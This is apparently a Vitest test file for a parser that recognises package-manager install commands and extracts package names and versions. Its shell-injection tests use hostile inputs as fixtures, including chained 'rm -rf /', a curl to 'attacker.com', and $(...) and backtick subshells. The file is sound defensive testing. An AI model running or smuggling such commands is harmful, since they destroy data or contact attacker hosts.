import { describe, it, expect } from 'vitest';
import { parseInstallCommand } from './parser';

describe('parseInstallCommand', () => {
  it('ignores non-install commands', () => {
    expect(parseInstallCommand('git clone https://github.com/repo').isInstall).toBe(false);
    expect(parseInstallCommand('npm run build').isInstall).toBe(false);
    expect(parseInstallCommand('npm test').isInstall).toBe(false);
    expect(parseInstallCommand('node script.js').isInstall).toBe(false);
    expect(parseInstallCommand('pnpm lint').isInstall).toBe(false);
  });

  it('detects simple install commands', () => {
    const res = parseInstallCommand('npm install react');
    expect(res.isInstall).toBe(true);
    expect(res.packageManager).toBe('npm');
    expect(res.packages).toEqual([{ name: 'react' }]);
  });

  it('detects aliased install commands', () => {
    const res = parseInstallCommand('npm i express');
    expect(res.isInstall).toBe(true);
    expect(res.packageManager).toBe('npm');
    expect(res.packages).toEqual([{ name: 'express' }]);
  });

  it('detects pnpm add', () => {
    const res = parseInstallCommand('pnpm add lodash');
    expect(res.isInstall).toBe(true);
    expect(res.packageManager).toBe('pnpm');
    expect(res.packages).toEqual([{ name: 'lodash' }]);
  });

  it('ignores flags', () => {
    const res = parseInstallCommand('yarn add -D typescript --exact');
    expect(res.isInstall).toBe(true);
    expect(res.packageManager).toBe('yarn');
    expect(res.packages).toEqual([{ name: 'typescript' }]);
  });

  it('extracts multiple packages', () => {
    const res = parseInstallCommand('bun install react react-dom');
    expect(res.packages).toEqual([
      { name: 'react' },
      { name: 'react-dom' }
    ]);
  });

  it('extracts scoped packages and versions', () => {
    const res = parseInstallCommand('npm install @types/node@18.0.0 react@^18');
    expect(res.packages).toEqual([
      { name: '@types/node', version: '18.0.0' },
      { name: 'react', version: '^18' }
    ]);
  });

  describe('shell injection protection', () => {
    it('stops at &&', () => {
      const res = parseInstallCommand('npm install react && curl attacker.com');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });

    it('stops at ;', () => {
      const res = parseInstallCommand('npm install react; rm -rf /');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });

    it('stops at attached ;', () => {
      const res = parseInstallCommand('npm install react;rm -rf /');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });

    it('stops at |', () => {
      const res = parseInstallCommand('npm install react | grep error');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });

    it('stops at inline subshells $(...)', () => {
      const res = parseInstallCommand('npm install react $(malicious-command)');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });

    it('stops at backticks', () => {
      const res = parseInstallCommand('npm install react `malicious-command`');
      expect(res.packages).toEqual([{ name: 'react' }]);
    });
  });
});
